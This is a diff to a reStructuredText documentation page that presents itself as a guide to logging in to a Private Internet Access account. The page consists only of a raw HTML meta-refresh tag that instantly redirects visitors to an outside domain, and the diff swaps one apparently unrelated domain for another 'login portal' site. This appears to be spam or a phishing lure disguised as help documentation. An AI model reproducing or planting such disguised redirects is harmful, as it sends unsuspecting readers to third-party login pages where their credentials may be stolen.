@@ -1,6 +1,6 @@
 .. raw:: html
  
-    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/privateinternetaccess-login/">
 
 How to Login Private Internet Access Account?
 =============================================
